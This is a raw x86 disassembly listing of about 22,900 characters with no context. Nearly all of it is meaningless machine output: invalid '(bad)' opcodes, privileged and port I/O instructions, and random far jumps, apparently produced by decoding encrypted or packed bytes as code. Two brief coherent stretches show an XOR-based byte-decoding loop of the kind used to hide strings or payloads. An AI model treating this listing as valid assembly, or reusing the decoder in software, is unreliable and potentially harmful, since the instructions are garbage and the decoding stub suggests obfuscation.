  403a5e:	fidivr WORD PTR [esp+esi*4+0x54]
  403a62:	sub    BYTE PTR [ebx-0x5e],dl
  403a65:	jae    0x403a5d
  403a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a68:	xchg   edi,eax
  403a69:	dec    esi
  403a6a:	scas   eax,DWORD PTR es:[edi]
  403a6b:	jb     0x403aa8
  403a6d:	popf   
  403a6e:	bound  ebp,QWORD PTR [edi-0x57dc683a]
  403a74:	pop    ecx
  403a75:	(bad)  
  403a76:	mov    ds:0x2fcb13b7,al
  403a7b:	sbb    al,0x4
  403a7d:	aaa    
  403a7e:	mov    cl,dl
  403a80:	jae    0x403a5d
  403a82:	(bad)  
  403a83:	mov    ch,0x61
  403a85:	inc    esi
  403a86:	ss out 0x8a,al
  403a89:	xchg   ebp,eax
  403a8a:	dec    ecx
  403a8b:	sub    BYTE PTR [eax+0x77],cl
  403a8e:	mov    ebp,0x91d0349f
  403a93:	cdq    
  403a94:	push   eax
  403a95:	bound  edi,QWORD PTR [ebx+edi*2+0x12310af6]
  403a9c:	clc    
  403a9d:	mov    ecx,0xf289b20e
  403aa2:	sub    edx,ebp
  403aa4:	mov    ds:0x3c97545f,al
  403aa9:	jecxz  0x403b13
  403aab:	mov    bh,0x45
  403aad:	cs jns 0x403b20
  403ab0:	pop    ecx
  403ab1:	dec    esi
  403ab2:	pop    ds
  403ab3:	mov    bl,0x9b
  403ab5:	fdivp  st(7),st
  403ab7:	pop    es
  403ab8:	dec    edi
  403ab9:	mov    dh,0x3b
  403abb:	sbb    DWORD PTR [edx+eiz*1+0x1378bf98],0x8ee3f42a
  403ac6:	fcomp  QWORD PTR [ebx-0xf]
  403ac9:	push   0xf82916c6
  403ace:	sub    eax,0xd8a3ec9d
  403ad3:	nop
  403ad4:	les    esi,FWORD PTR [edx+eiz*1+0xf1c8ecc]
  403adb:	cmp    al,0xa6
  403add:	jae    0x403b3a
  403adf:	ror    BYTE PTR [edi+0x6c],cl
  403ae2:	jl     0x403ac3
  403ae4:	lahf   
  403ae5:	mov    al,ds:0x222f83f3
  403aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aeb:	xchg   ecx,eax
  403aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aed:	pop    edx
  403aee:	cmc    
  403aef:	pop    edx
  403af0:	add    dl,cl
  403af2:	out    0x69,eax
  403af4:	push   eax
  403af5:	pop    ds
  403af6:	in     al,0x5
  403af8:	or     eax,0xce63f972
  403afd:	push   eax
  403afe:	cs add ch,dh
  403b01:	mov    bl,0xca
  403b03:	dec    ebx
  403b04:	call   0xfba6:0xfee50af6
  403b0b:	int    0xc2
  403b0d:	and    BYTE PTR [edx-0x2e],al
  403b10:	or     eax,0x8acd8755
  403b15:	sub    eax,0x51d3e9a9
  403b1a:	push   edx
  403b1b:	mov    DWORD PTR [eax+edi*8-0x4b],0x80d22ad4
  403b23:	or     eax,0xa86c5e23
  403b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b29:	cwde   
  403b2a:	or     DWORD PTR [edx],ecx
  403b2c:	and    esi,eax
  403b2e:	leave  
  403b2f:	fcomp  QWORD PTR ds:[edx]
  403b32:	(bad)  
  403b33:	hlt    
  403b34:	inc    ebp
  403b35:	sbb    al,0xa9
  403b37:	inc    esp
  403b38:	jo     0x403ba7
  403b3a:	pop    DWORD PTR [ebx]
  403b3c:	mov    edi,0x35e7d8c0
  403b41:	dec    ecx
  403b42:	mov    eax,ds:0x80cfe693
  403b47:	push   edi
  403b48:	cmc    
  403b49:	(bad)  
  403b4a:	cdq    
  403b4b:	push   eax
  403b4c:	pusha  
  403b4d:	xchg   ebx,eax
  403b4e:	(bad)  [eax-0x2c]
  403b51:	push   ds
  403b52:	pop    edi
  403b53:	sub    eax,0xa9a345ed
  403b58:	inc    ecx
  403b59:	jecxz  0x403bb9
  403b5b:	inc    esi
  403b5c:	inc    eax
  403b5d:	xor    eax,0x1d9350e9
  403b62:	sysexit 
  403b64:	in     al,0x73
  403b66:	pop    esi
  403b67:	mov    ecx,0xdaed76a3
  403b6c:	test   BYTE PTR [eax+0x4c872e4d],bh
  403b72:	xchg   ebp,eax
  403b73:	push   edi
  403b74:	idiv   esi
  403b76:	retf   
  403b77:	and    cl,dl
  403b79:	test   al,0xb7
  403b7b:	leave  
  403b7c:	(bad)  
  403b7d:	push   cs
  403b7e:	cmp    al,0xdb
  403b80:	mov    edi,0xe67c6cf8
  403b85:	xchg   esi,eax
  403b86:	(bad)  
  403b87:	fbld   TBYTE PTR [eax-0x23]
  403b8a:	xor    al,0x8a
  403b8c:	mov    WORD PTR [edx-0x18],ss
  403b8f:	mov    ah,0x1
  403b91:	fwait
  403b92:	out    dx,al
  403b93:	sbb    edi,ebp
  403b95:	enter  0xb66c,0x97
  403b99:	clc    
  403b9a:	(bad)  
  403b9b:	pop    ebx
  403b9c:	jp     0x403b3b
  403b9e:	dec    esp
  403b9f:	jp     0x403c06
  403ba1:	pushf  
  403ba2:	(bad)  
  403ba3:	scas   eax,DWORD PTR es:[edi]
  403ba4:	xchg   esi,eax
  403ba5:	pop    edx
  403ba6:	jae    0x403b8d
  403ba8:	add    BYTE PTR [eax+0x446f7d8f],dl
  403bae:	push   cs
  403baf:	std    
  403bb0:	outs   dx,DWORD PTR ds:[esi]
  403bb1:	jae    0x403b64
  403bb3:	je     0x403b39
  403bb5:	sub    ebx,DWORD PTR [ebx]
  403bb7:	dec    esp
  403bb8:	inc    ebx
  403bb9:	cmp    cl,BYTE PTR [ebp-0x3]
  403bbc:	mov    dh,0x5b
  403bbe:	arpl   WORD PTR [ebx+0x43],cx
  403bc1:	jecxz  0x403b4d
  403bc3:	pusha  
  403bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bc5:	js     0x403b56
  403bc7:	push   esi
  403bc8:	sub    DWORD PTR [esi+ebx*2],ecx
  403bcb:	or     esp,DWORD PTR [ebx+eiz*4]
  403bce:	dec    esi
  403bcf:	and    BYTE PTR [ebx-0xaee3535],0xc6
  403bd6:	(bad)  
  403bd7:	enter  0x9078,0x6
  403bdb:	int    0xf0
  403bdd:	add    ch,bh
  403bdf:	stos   BYTE PTR es:[edi],al
  403be0:	ds mov ebx,0x82868a72
  403be6:	scas   eax,DWORD PTR es:[edi]
  403be7:	retf   
  403be8:	cmp    ebp,edx
  403bea:	sub    al,0xc1
  403bec:	imul   ebx,ebx,0x27fa9cd8
  403bf2:	(bad)  
  403bf3:	in     eax,0x5c
  403bf5:	mov    esp,DWORD PTR [edx+0x7109bb3]
  403bfb:	ja     0x403c55
  403bfd:	lds    ebx,FWORD PTR ds:0xfabe5605
  403c03:	daa    
  403c04:	pop    ebp
  403c05:	int3   
  403c06:	hlt    
  403c07:	push   eax
  403c08:	cmp    dl,dl
  403c0a:	cli    
  403c0b:	xchg   esp,eax
  403c0c:	xchg   edx,eax
  403c0d:	jmp    0x58ee:0xb0dae160
  403c14:	jp     0x403bd6
  403c16:	loop   0x403bc9
  403c18:	cmp    bh,BYTE PTR [edi+ebx*2-0x55]
  403c1c:	sub    al,0xc5
  403c1e:	pop    edi
  403c1f:	pop    esi
  403c20:	stos   DWORD PTR es:[edi],eax
  403c21:	fmulp  st(5),st
  403c23:	sub    bh,0xc
  403c26:	and    ecx,0x46
  403c29:	adc    ah,BYTE PTR [ebp-0x2e641c00]
  403c2f:	repz xchg ecx,eax
  403c31:	gs mov bh,0x89
  403c34:	jecxz  0x403c95
  403c36:	push   ds
  403c37:	cli    
  403c38:	jne    0x403c1f
  403c3a:	icebp  
  403c3b:	hlt    
  403c3c:	mov    bh,0x1e
  403c3e:	out    0x71,eax
  403c40:	mov    BYTE PTR [esi-0x7b],dl
  403c43:	aas    
  403c44:	push   ecx
  403c45:	ret    
  403c46:	push   esp
  403c47:	xlat   BYTE PTR ds:[ebx]
  403c48:	popa   
  403c49:	rcl    BYTE PTR [ebp-0x4b62f392],0xa7
  403c50:	hlt    
  403c51:	xchg   edx,eax
  403c52:	adc    ebx,DWORD PTR [edx-0x46]
  403c55:	or     DWORD PTR [eax-0x27],0x65
  403c59:	clc    
  403c5a:	ss push ecx
  403c5c:	iret   
  403c5d:	imul   esp,DWORD PTR [edi+eax*8+0x3f360fd0],0x12905a84
  403c68:	clc    
  403c69:	sub    DWORD PTR [ebx-0x17],esi
  403c6c:	pop    eax
  403c6d:	mov    DWORD PTR [eax-0x1eec2ef],ecx
  403c73:	test   eax,0xb67bc2ac
  403c78:	outs   dx,DWORD PTR ds:[esi]
  403c79:	inc    ebx
  403c7a:	shr    DWORD PTR [eax],cl
  403c7c:	inc    esp
  403c7d:	mov    bh,0xc1
  403c7f:	imul   esi,DWORD PTR [edx],0xd4462349
  403c85:	aaa    
  403c86:	xchg   ebp,eax
  403c87:	xor    edx,eax
  403c89:	jo     0x403cb2
  403c8b:	dec    ebp
  403c8c:	mov    DWORD PTR [ebp-0x5937756d],esp
  403c92:	pop    esp
  403c93:	cmp    al,0xc2
  403c95:	mov    ebp,0xb4117717
  403c9a:	cdq    
  403c9b:	jo     0x403ca5
  403c9d:	repnz outs dx,DWORD PTR ds:[esi]
  403c9f:	dec    edx
  403ca0:	sub    ah,BYTE PTR [esi+0x3]
  403ca3:	(bad)  
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0xc8958060
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403ca9
  403cf7:	ror    BYTE PTR [ecx-0x15],0x3f
  403cfb:	aaa    
  403cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cfd:	mov    ebp,0x7708a830
  403d02:	out    0x5c,eax
  403d04:	push   eax
  403d05:	std    
  403d06:	lods   eax,DWORD PTR ds:[esi]
  403d07:	push   cs
  403d08:	outs   dx,BYTE PTR ds:[esi]
  403d09:	stc    
  403d0a:	sub    DWORD PTR [edx+0x16d6da38],esi
  403d10:	out    dx,al
  403d11:	stos   BYTE PTR es:[edi],al
  403d12:	ins    DWORD PTR es:[edi],dx
  403d13:	ficom  WORD PTR [ecx+edx*2+0x31]
  403d17:	xchg   ebp,eax
  403d18:	fidivr DWORD PTR [eax+0x295a37f9]
  403d1e:	jecxz  0x403cbf
  403d20:	enter  0x64d2,0xd6
  403d24:	outs   dx,DWORD PTR ds:[esi]
  403d25:	mov    ebp,DWORD PTR [ebx+0x11]
  403d28:	xchg   ebx,eax
  403d29:	jo     0x403d15
  403d2b:	cli    
  403d2c:	syscall 
  403d2e:	or     eax,0xab253743
  403d33:	rol    BYTE PTR [edi-0xba268cf],1
  403d39:	in     al,0x21
  403d3b:	xor    al,0x61
  403d3d:	jmp    0x403cda
  403d3f:	cmp    eax,0x15718ddf
  403d44:	in     al,0x8d
  403d46:	ret    0xf2af
  403d49:	std    
  403d4a:	sbb    ecx,DWORD PTR [esi-0x6fcbe8db]
  403d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d51:	cmp    ebx,DWORD PTR [ecx-0x7f]
  403d54:	add    esi,DWORD PTR [ebx+0x10bf2662]
  403d5a:	pop    edi
  403d5b:	cs push 0xa3116e52
  403d61:	in     eax,dx
  403d62:	cmp    dh,BYTE PTR [edi+ebx*1+0x2fe09aef]
  403d69:	outs   dx,DWORD PTR ds:[esi]
  403d6a:	push   ecx
  403d6b:	sub    bh,dh
  403d6d:	clc    
  403d6e:	clc    
  403d6f:	hlt    
  403d70:	mov    BYTE PTR [esi+0x7c3a5c0e],ah
  403d76:	rol    ecx,1
  403d78:	or     ch,BYTE PTR [edx-0x7d5ed191]
  403d7e:	es jecxz 0x403d76
  403d81:	cs dec eax
  403d83:	out    dx,al
  403d84:	inc    ecx
  403d85:	mov    edi,0xe5e7d759
  403d8a:	daa    
  403d8b:	jmp    0x403d99
  403d8d:	retf   
  403d8e:	xor    eax,ebp
  403d90:	xchg   edi,eax
  403d91:	les    ebx,FWORD PTR [edi]
  403d93:	push   edi
  403d94:	cmc    
  403d95:	(bad)
  403d98:	lea    edx,[ecx+0x73ddf2b9]
  403d9e:	xchg   esp,eax
  403d9f:	mov    ebx,DWORD PTR [ecx]
  403da1:	sub    BYTE PTR [ebp*8-0x54ebe0ec],cl
  403da8:	inc    ebp
  403da9:	mov    esi,0xd6dac8be
  403dae:	sar    BYTE PTR [eax-0x513ec76d],cl
  403db4:	xor    ecx,DWORD PTR [esi+0x2c]
  403db7:	inc    esp
  403db8:	int3   
  403db9:	out    0x16,eax
  403dbb:	rcr    DWORD PTR [ebp+0x184bfe],1
  403dc1:	ins    DWORD PTR es:[edi],dx
  403dc2:	inc    edx
  403dc3:	mov    bh,0x9d
  403dc5:	sbb    cl,BYTE PTR [esi+edi*1+0x243dd653]
  403dcc:	in     al,dx
  403dcd:	add    ch,BYTE PTR [ecx-0x54af764]
  403dd3:	icebp  
  403dd4:	push   ebp
  403dd5:	rol    DWORD PTR [ecx+0x7a976af0],cl
  403ddb:	sbb    ch,BYTE PTR [eax+0x1241fcfb]
  403de1:	rol    edi,cl
  403de3:	mov    ds:0x4dbc3007,al
  403de8:	bound  esp,QWORD PTR [eax]
  403dea:	xchg   DWORD PTR ds:0xd650104,edi
  403df0:	pop    ebp
  403df1:	xchg   esi,eax
  403df2:	je     0x403e29
  403df4:	jcxz   0x403d99
  403df7:	scas   eax,DWORD PTR es:[edi]
  403df8:	adc    eax,0x2ee13483
  403dfd:	les    ebp,FWORD PTR [edx+ebp*4+0x7739cec8]
  403e04:	test   eax,0x75bedf82
  403e09:	ret    
  403e0a:	jmp    0x403d97
  403e0c:	cmp    ah,BYTE PTR [ecx+0x43]
  403e0f:	loope  0x403e5d
  403e11:	dec    edx
  403e12:	mov    al,0xd6
  403e14:	xchg   edi,eax
  403e15:	xor    BYTE PTR [eax],0xd0
  403e18:	mov    dl,0xed
  403e1a:	imul   ebp,DWORD PTR [ecx-0x4f],0x79
  403e1e:	test   WORD PTR [ebx-0x44947537],sp
  403e25:	xchg   ebx,eax
  403e26:	shl    DWORD PTR [edi+ebx*8-0x4f],cl
  403e2a:	imul   eax,DWORD PTR [edx],0xd5a03bf3
  403e30:	mov    edi,0x61dc83a7
  403e35:	out    dx,al
  403e36:	push   cs
  403e37:	(bad)  
  403e38:	rcl    DWORD PTR [ecx],cl
  403e3a:	sbb    DWORD PTR [eax],ebp
  403e3c:	pop    ecx
  403e3d:	jnp    0x403e29
  403e3f:	cmp    al,0xf0
  403e41:	mov    eax,0x7f066429
  403e46:	mov    eax,ds:0x27f6ac7
  403e4b:	dec    eax
  403e4c:	push   0x66
  403e4e:	sub    eax,0xeea52aeb
  403e53:	mov    bh,0xb3
  403e55:	sub    BYTE PTR [ebx-0x6defd5a0],0x3c
  403e5c:	sbb    BYTE PTR [esp+ebx*1-0x80],dl
  403e60:	mov    edx,0x73cb38f8
  403e65:	sub    ah,bl
  403e67:	inc    edx
  403e68:	stc    
  403e69:	mov    dh,0xa7
  403e6b:	out    0x94,al
  403e6d:	iret   
  403e6e:	jmp    0x403e78
  403e70:	add    al,0x1a
  403e72:	mov    eax,0xc8c01d0b
  403e77:	retf   
  403e78:	cmp    DWORD PTR [edi+edx*8+0x51],edi
  403e7c:	mov    ch,0x0
  403e7e:	pusha  
  403e7f:	push   eax
  403e80:	sar    bl,0x52
  403e83:	dec    edi
  403e84:	cmp    al,0xfe
  403e86:	out    0x9,eax
  403e88:	mov    ch,0xe3
  403e8a:	xor    al,0x59
  403e8c:	sbb    al,bh
  403e8e:	sbb    DWORD PTR [edi-0x45e0ccd],esp
  403e94:	mov    bl,0x56
  403e96:	mov    edx,0x6c0d593e
  403e9b:	push   esp
  403e9c:	xchg   esp,eax
  403e9d:	push   ebx
  403e9e:	hlt    
  403e9f:	push   eax
  403ea0:	jecxz  0x403e6b
  403ea2:	inc    ecx
  403ea3:	xchg   BYTE PTR [esi-0x172a343f],ah
  403ea9:	iret   
  403eaa:	jmp    0x403f27
  403eac:	add    al,0x5
  403eae:	outs   dx,DWORD PTR ds:[esi]
  403eaf:	aas    
  403eb0:	mov    esi,DWORD PTR [ecx-0x4d404723]
  403eb6:	xchg   ebp,eax
  403eb7:	mov    DWORD PTR [ecx+0x2a],esp
  403eba:	int3   
  403ebb:	aad    0x11
  403ebd:	dec    edx
  403ebe:	mov    ds:0x39e7747c,al
  403ec3:	mov    ds:0xf77da884,eax
  403ec8:	cmp    esi,ecx
  403eca:	test   BYTE PTR [esi+eax*4-0x18c11805],ch
  403ed1:	jecxz  0x403e60
  403ed3:	mov    esi,0x8cfe7590
  403ed8:	jns    0x403f55
  403eda:	sti    
  403edb:	retf   0x97ea
  403ede:	inc    esi
  403edf:	test   al,0xf6
  403ee1:	xchg   edx,eax
  403ee2:	(bad)  
  403ee3:	mov    dl,0xa
  403ee5:	pop    ebx
  403ee6:	pop    ebp
  403ee7:	mov    edx,0xe22d685b
  403eec:	out    dx,eax
  403eed:	out    dx,eax
  403eee:	xchg   ebp,eax
  403eef:	sub    DWORD PTR [eax+0x6400b835],esi
  403ef5:	repz sbb DWORD PTR [ebx+0x75bf9c46],esi
  403efc:	mov    bh,BYTE PTR [esp+edx*4+0x19ce364d]
  403f03:	arpl   WORD PTR [ecx],bp
  403f05:	call   0x122deef
  403f0a:	mov    ah,0x9e
  403f0c:	(bad)  
  403f0d:	mov    ch,0x87
  403f0f:	inc    esp
  403f11:	cmp    DWORD PTR [edi+0x3815e6c],ebp
  403f17:	std    
  403f18:	jb     0x403ec9
  403f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f1b:	gs mov eax,0xefb21d2e
  403f21:	inc    edi
  403f22:	inc    ebx
  403f23:	mov    dl,0xe8
  403f25:	inc    edx
  403f26:	adc    BYTE PTR [edi-0x67],0x63
  403f2a:	jp     0x403f03
  403f2c:	sub    eax,0x65d79a89
  403f31:	dec    ecx
  403f32:	sbb    ch,dh
  403f34:	push   ax
  403f36:	or     esp,esi
  403f38:	cld    
  403f39:	pop    ebx
  403f3a:	popa   
  403f3b:	and    bl,BYTE PTR [ebx-0x2942d816]
  403f41:	add    al,0xab
  403f43:	nop
  403f44:	rcl    BYTE PTR [esi-0x3ae7969f],1
  403f4a:	aas    
  403f4b:	test   dh,ah
  403f4d:	fisubr DWORD PTR ds:[edx+0x61286197]
  403f54:	outs   dx,DWORD PTR ds:[esi]
  403f55:	shl    BYTE PTR ds:0x7c401e03,1
  403f5b:	arpl   WORD PTR [ebx-0x7e],ax
  403f5e:	fcomp  DWORD PTR [edx+0x13]
  403f61:	mov    edi,esp
  403f63:	loop   0x403f96
  403f65:	test   DWORD PTR [edi],ebx
  403f67:	out    0xa7,al
  403f69:	sti    
  403f6a:	xor    esp,eax
  403f6c:	popa   
  403f6d:	adc    dh,dl
  403f6f:	xchg   edx,eax
  403f70:	mov    ebx,0x9af60b3b
  403f75:	inc    ebp
  403f76:	mov    bh,0x17
  403f78:	repz and DWORD PTR [edi],esi
  403f7b:	fcom   QWORD PTR [eax]
  403f7d:	and    eax,0x120b222e
  403f82:	test   BYTE PTR [eax],cl
  403f84:	add    esp,DWORD PTR [ebp+0x35f582cf]
  403f8a:	cmc    
  403f8b:	aad    0x6c
  403f8d:	pop    esp
  403f8e:	rcr    BYTE PTR [ecx],1
  403f90:	adc    al,0x58
  403f92:	dec    eax
  403f93:	sub    bl,dh
  403f95:	in     eax,dx
  403f96:	mov    ds:0x28383812,eax
  403f9b:	ss out 0x9,eax
  403f9e:	in     eax,dx
  403f9f:	add    BYTE PTR [esi+0x46],dh
  403fa2:	sub    DWORD PTR [esi-0x50],0xffffff94
  403fa6:	cmc    
  403fa7:	push   cs
  403fa8:	add    al,0x6d
  403faa:	imul   esi,edx,0x3b
  403fad:	fst    QWORD PTR [esi]
  403faf:	push   ds
  403fb0:	pop    edi
  403fb1:	sub    eax,0xa5ca9e55
  403fb6:	(bad)  
  403fb7:	or     BYTE PTR [ebx],al
  403fb9:	cmp    ebp,esi
  403fbb:	and    DWORD PTR [edx-0x14b20eb0],eax
  403fc1:	ret    
  403fc2:	fmul   QWORD PTR [edx+ecx*1-0x70]
  403fc6:	outs   dx,DWORD PTR ds:[esi]
  403fc7:	push   ebx
  403fc8:	les    eax,FWORD PTR [ecx]
  403fca:	out    0xbc,al
  403fcc:	scas   eax,DWORD PTR es:[edi]
  403fcd:	xchg   esi,eax
  403fce:	or     DWORD PTR [ebx],ebp
  403fd0:	mov    dl,0x4d
  403fd2:	sti    
  403fd3:	aad    0x44
  403fd5:	out    dx,al
  403fd6:	mov    dh,0xa6
  403fd8:	inc    ebx
  403fd9:	pop    ebx
  403fda:	out    dx,al
  403fdb:	sub    BYTE PTR [esi],al
  403fdd:	inc    esp
  403fde:	add    esp,esp
  403fe0:	lods   eax,DWORD PTR ds:[esi]
  403fe1:	add    al,0x61
  403fe3:	xor    eax,0x4440f9c4
  403fe8:	out    dx,al
  403fe9:	xor    BYTE PTR [esi-0x469c2b12],al
  403fef:	inc    edi
  403ff0:	sub    al,0x5a
  403ff2:	mov    esi,0x97ea9a73
  403ff7:	and    BYTE PTR [ecx+0x60],ch
  403ffa:	xchg   edx,eax
  403ffb:	jae    0x403f88
  403ffd:	fidivr WORD PTR [ebx]
  403fff:	(bad)  
  404001:	inc    edi
  404002:	mov    ebp,DWORD PTR [ecx]
  404004:	jl     0x403f8f
  404006:	in     eax,dx
  404007:	(bad)
  40400a:	sub    DWORD PTR [eax+0x57],esp
  40400d:	or     DWORD PTR [eax+esi*4],ebp
  404010:	xchg   ebx,eax
  404011:	push   0xb4ee7b2f
  404016:	and    DWORD PTR [ecx+0x4047305e],edx
  40401c:	add    al,0xad
  40401e:	dec    eax
  40401f:	pop    edi
  404020:	gs lahf 
  404022:	ja     0x40405d
  404024:	push   es
  404025:	aas    
  404026:	nop
  404027:	fwait
  404028:	push   ecx
  404029:	aas    
  40402a:	sub    DWORD PTR [ecx-0x4d7fbc89],edx
  404030:	xchg   ebx,eax
  404031:	sub    eax,0x911a7a73
  404036:	icebp  
  404037:	and    ebx,ebx
  404039:	pop    ds
  40403a:	sub    esp,DWORD PTR [ebp+ebx*2-0x45]
  40403e:	int    0xc4
  404040:	lds    ecx,FWORD PTR [ebx+0x22]
  404043:	mov    ebp,0xc9eb51b3
  404048:	dec    esp
  404049:	mov    eax,ds:0x8bdda1df
  40404e:	mov    esp,DWORD PTR ds:[edx]
  404051:	mov    bl,0xad
  404053:	mov    edx,esp
  404055:	sub    ch,al
  404057:	xor    ebx,ebx
  404059:	mov    WORD PTR [ebx+0x1c0623ab],cs
  40405f:	sbb    al,0xc0
  404061:	sub    ch,ah
  404063:	cmp    eax,0xee6c4ecf
  404068:	jb     0x40408e
  40406a:	dec    ebp
  40406b:	arpl   bp,ax
  40406d:	jmp    0x78fb:0x4e33f799
  404074:	jne    0x404036
  404076:	test   eax,0x6ce1e86b
  40407b:	jle    0x4040b3
  40407d:	in     eax,0x70
  40407f:	dec    esp
  404080:	add    al,dh
  404082:	test   eax,0xe8b3e803
  404087:	sub    BYTE PTR [edx],0x86
  40408a:	add    DWORD PTR [esi],0xd62459da
  404090:	mov    esi,0x63069f6d
  404095:	push   cs
  404096:	cmp    al,0xac
  404098:	test   eax,0xadbdcf8f
  40409d:	jl     0x40405a
  40409f:	repz add bl,ah
  4040a2:	mov    esi,0x5bd98729
  4040a7:	jle    0x404104
  4040a9:	inc    edx
  4040aa:	push   eax
  4040ab:	retf   
  4040ac:	add    bl,BYTE PTR [ebx-0x24e29cee]
  4040b2:	jno    0x40408c
  4040b4:	aas    
  4040b5:	xchg   ebx,eax
  4040b6:	js     0x4040d6
  4040b8:	pop    es
  4040b9:	scas   eax,DWORD PTR es:[edi]
  4040ba:	and    ecx,DWORD PTR [edi+edi*8+0x520e2cf]
  4040c1:	jge    0x4040fa
  4040c3:	or     esi,DWORD PTR [eax-0x6f4f516a]
  4040c9:	sub    ebx,DWORD PTR [esi-0x744c367f]
  4040cf:	inc    ebp
  4040d0:	clc    
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x1ff25acd],ah
  4040ef:	mov    BYTE PTR [ebx+0x567e7e1b],dl
  4040f5:	jns    0x404175
  4040f7:	jle    0x40416d
  4040f9:	and    DWORD PTR fs:[esi-0x22],ebx
  4040fd:	test   DWORD PTR [ecx-0x11986e7e],esi
  404103:	fadd   QWORD PTR [edi-0x4]
  404106:	xor    dh,bh
  404108:	shl    BYTE PTR [edi-0x52],1
  40410b:	add    ah,al
  40410d:	or     DWORD PTR [esi+edi*4-0x39ff948e],ebx
  404114:	js     0x4040f5
  404116:	push   edi
  404117:	cmc    
  404118:	lea    edi,[bx+0x79]
  40411c:	ret    
  40411d:	test   BYTE PTR [esi],al
  40411f:	js     0x40412f
  404121:	jge    0x40416d
  404123:	(bad)  
  404124:	push   edi
  404125:	cli    
  404126:	adc    ebp,DWORD PTR [ebx+edi*8-0x2f]
  40412a:	pop    es
  40412b:	pop    eax
  40412c:	mov    esp,0xe3907a61
  404131:	fs test al,0x7c
  404134:	and    eax,0x5a378006
  404139:	fistp  QWORD PTR [eax+0x25]
  40413c:	adc    BYTE PTR ds:0x4e9dfc99,ah
  404142:	or     ah,dh
  404144:	mov    eax,ds:0x13ac3597
  404149:	mov    DWORD PTR [edx],edi
  40414b:	or     bl,dl
  40414d:	cmp    ecx,eax
  40414f:	mov    ss,WORD PTR [esi+0x16]
  404152:	(bad)  
  404153:	pushf  
  404154:	mov    ebx,0xbade313f
  404159:	fnstenv [ecx+0x25]
  40415c:	push   ds
  40415d:	and    BYTE PTR [esp+eax*1-0x66cbd11d],0x93
  404165:	nop
  404166:	(bad)  
  404167:	pop    eax
  404168:	fimul  DWORD PTR [eax-0x2453ad58]
  40416e:	dec    esi
  40416f:	add    DWORD PTR [edi],0x59
  404172:	pushw  ds
  404174:	mov    cl,0xd1
  404176:	int3   
  404177:	ret    0xc2fe
  40417a:	cmp    ebp,DWORD PTR [ecx+0x79a73e41]
  404180:	jp     0x404175
  404182:	ror    BYTE PTR ds:0x3d1a689b,0x50
  404189:	mov    bl,0x2c
  40418b:	das    
  40418c:	push   ds
  40418d:	or     eax,0x1ddba924
  404192:	imul   esp,DWORD PTR [ebp+0x1d2a8827],0xffffff83
  404199:	cmp    bl,BYTE PTR [ebx+0x0]
  40419c:	cmc    
  40419d:	int    0xf6
  40419f:	int    0xd4
  4041a1:	push   0x30
  4041a3:	cmp    bh,BYTE PTR [ebx+0x67]
  4041a6:	cmp    eax,0x198d4be1
  4041ab:	or     al,0x8d
  4041ad:	xchg   DWORD PTR [edx],ebx
  4041af:	jmp    0x5d878c9c
  4041b4:	xchg   esp,eax
  4041b5:	fcmovbe st,st(2)
  4041b7:	or     BYTE PTR [edx],0xf4
  4041ba:	add    DWORD PTR [eax+0x46bace4d],ecx
  4041c0:	fiadd  WORD PTR [esi+0x6f]
  4041c3:	dec    edx
  4041c4:	adc    ecx,DWORD PTR [eax+ebx*1]
  4041c7:	or     eax,0x60f5ed98
  4041cc:	jae    0x4041e9
  4041ce:	xchg   esi,eax
  4041cf:	shl    BYTE PTR [ecx+ecx*8-0x6],1
  4041d3:	mov    ds:0x932d88a1,al
  4041d8:	dec    eax
  4041d9:	stos   BYTE PTR es:[edi],al
  4041da:	xor    BYTE PTR ds:0x45c9de85,bh
  4041e0:	inc    esp
  4041e1:	add    esi,DWORD PTR [edx-0x4ee9982]
  4041e7:	sub    eax,0x7e384f8
  4041ec:	jg     0x40421e
  4041ee:	adc    ecx,DWORD PTR [ebp+0x258c63d2]
  4041f4:	nop
  4041f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f6:	popa   
  4041f7:	xor    al,0xba
  4041f9:	cmp    al,0xed
  4041fb:	sub    BYTE PTR [ebp-0x19ae8e7a],0x51
  404202:	xchg   esi,eax
  404203:	adc    al,0xa5
  404205:	pop    ds
  404206:	mov    ds:0x6903d4e5,eax
  40420b:	inc    esi
  40420c:	push   0xd26a0a20
  404211:	imul   edx,edx,0x41e65235
  404217:	mov    dl,0x4d
  404219:	ds cs push ecx
  40421c:	outs   dx,BYTE PTR ds:[esi]
  40421d:	(bad)  
  40421e:	fcmovnbe st,st(2)
  404220:	int3   
  404221:	jo     0x4041e8
  404223:	sub    eax,0x4c2ffdf3
